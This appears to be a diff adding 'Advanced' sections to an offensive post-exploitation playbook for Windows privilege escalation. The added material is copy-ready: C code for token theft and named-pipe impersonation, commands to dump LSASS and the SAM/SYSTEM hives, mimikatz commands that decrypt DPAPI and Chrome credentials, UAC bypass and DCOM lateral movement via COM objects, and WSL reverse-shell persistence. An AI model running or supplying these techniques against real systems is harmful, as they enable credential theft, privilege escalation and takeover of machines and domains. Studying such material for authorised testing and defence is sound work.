@@ -5,6 +5,14 @@ metadata:
   type: offensive
   phase: post-exploitation
   tools: winpeas, seatbelt, sharpup, rubeus, mimikatz, powerview, bloodhound
+kill_chain:
+  phase: [exploit, actions]
+  step: [4, 7]
+  attck_tactics: [TA0004]
+depends_on: [network-attack, exploit-development]
+feeds_into: [red-team-ops, advanced-redteam, active-directory-attack]
+inputs: [shell_access, os_fingerprint]
+outputs: [elevated_access, finding_record]
 ---
 
 # Windows Privilege Escalation
@@ -194,4 +202,152 @@ Rubeus.exe asktgt /user:victim /certificate:cert.pfx /password:pass /ptt
 # ADCS (Certificate Services)
 Certify.exe find /vulnerable
 Certify.exe request /ca:CA /template:VulnTemplate /altname:Administrator
+```
+
+## Advanced: Token Manipulation
+
+### Token Impersonation Deep Dive
+```c
+// Windows tokens: Primary (process identity) vs Impersonation (thread identity)
+// Impersonation levels: Anonymous < Identification < Impersonation < Delegation
+// Need Impersonation or Delegation level to actually use the token
+
+// Token theft from another process (requires SeDebugPrivilege):
+HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
+HANDLE hToken;
+OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
+HANDLE hDupToken;
+DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
+CreateProcessWithTokenW(hDupToken, 0, L"cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
+
+// EfsPotato — abuse Encrypting File System for SYSTEM token
+// CoercedPotato — consolidates multiple coercion techniques
+// GodPotato — works across all Windows versions via DCOM
+```
+
+### Token Privilege Abuse
+```powershell
+# SeBackupPrivilege → read any file (bypass DACL)
+robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM
+# Then: impacket-secretsdump -sam sam -system system LOCAL
+
+# SeRestorePrivilege → write any file (bypass DACL)
+# Overwrite protected files, plant DLL for hijacking
+
+# SeTakeOwnershipPrivilege → take ownership of any object
+# Take ownership of HKLM\SYSTEM key → modify services
+
+# SeLoadDriverPrivilege → load kernel driver (BYOVD)
+# Load vulnerable signed driver → kernel R/W → SYSTEM
+
+# SeManageVolumePrivilege → read raw disk
+# Bypass file permissions by reading raw NTFS
+
+# SeImpersonatePrivilege → Potato family exploits
+# PrintSpoofer, GodPotato, JuicyPotatoNG, EfsPotato, CoercedPotato
+```
+
+### Named Pipe Impersonation
+```c
+// Create pipe → trick privileged service into connecting → impersonate
+HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\evil",
+    PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 1, 1024, 1024, 0, NULL);
+ConnectNamedPipe(hPipe, NULL);
+ImpersonateNamedPipeClient(hPipe);
+// Now running as the connected client's identity
+```
+
+## Advanced: DPAPI Exploitation
+
+```powershell
+# DPAPI protects: browser passwords, WiFi keys, certificates, credential vault
+
+# Find DPAPI blobs
+dir /s /b C:\Users\*\AppData\Local\Microsoft\Credentials\*
+dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Protect\*  # Master keys
+
+# Decrypt with Mimikatz
+mimikatz # dpapi::masterkey /in:MASTER_KEY_FILE /rpc  # Uses DC to decrypt
+mimikatz # dpapi::cred /in:CRED_BLOB  # Decrypt credential blob
+mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
+
+# Domain DPAPI backup key (requires DA)
+mimikatz # lsadump::backupkeys /system:DC_IP /export
+# With backup key → decrypt ANY user's DPAPI blobs
+```
+
+## Advanced: COM Object Abuse
+
+### UAC Bypass via COM
+```powershell
+# CMSTPLUA COM object (auto-elevate)
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7"))
+$com.ShellExec("cmd.exe", "/c whoami", "", "runas", 0)
+
+# ICMLuaUtil COM object
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("D2E7025F-6BE0-4FBF-B128-10F02B5E3690"))
+$com.ShellExec("C:\evil.exe", $null, $null, $null, 0)
+```
+
+### DCOM Lateral Movement
+```powershell
+# MMC20.Application (requires local admin on target)
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889"), "TARGET")
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c payload", "7")
+
+# ShellWindows
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))
+$com.item().Document.Application.ShellExecute("cmd.exe", "/c payload", "", $null, 0)
+```
+
+## Advanced: WSL & Hyper-V Escape
+
+```bash
+# WSL filesystem: C:\Users\USER\AppData\Local\Packages\...\LocalState\rootfs\
+# From Windows: read WSL files (SSH keys, credentials)
+# From WSL: access Windows at /mnt/c/ with same user privileges
+
+# WSL as persistence:
+# Scheduled task → wsl.exe -e bash -c "reverse_shell"
+# WSL processes appear as wsl.exe → may bypass application control
+
+# Hyper-V escape (rare, high-impact):
+# CVE-2021-28476 (vmswitch RCE) — guest-to-host
+# Requires: specific VM configuration + unpatched host
+```
+
+## Advanced: Credential Harvesting Techniques
+
+### LSASS Dump Without Mimikatz
+```powershell
+# comsvcs.dll MiniDump (LOLBin — no external tools)
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
+
+# ProcDump (Sysinternals — signed by Microsoft)
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Task Manager (GUI — manual)
+# Right-click lsass.exe → Create dump file
+
+# Direct syscall dump (custom tool — avoids API hooks)
+# Use NtReadVirtualMemory with direct syscall to read LSASS memory
+
+# Silent Process Exit (abuse WER)
+# Configure LSASS to dump on "exit" via registry
+# Trigger: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"
+
+# Parse dump offline:
+pypykatz lsa minidump lsass.dmp
+mimikatz # sekurlsa::minidump lsass.dmp
+```
+
+### SAM/SYSTEM Without Admin (Volume Shadow Copy)
+```powershell
+# If SeBackupPrivilege or access to shadow copies:
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
+
+# Parse offline:
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
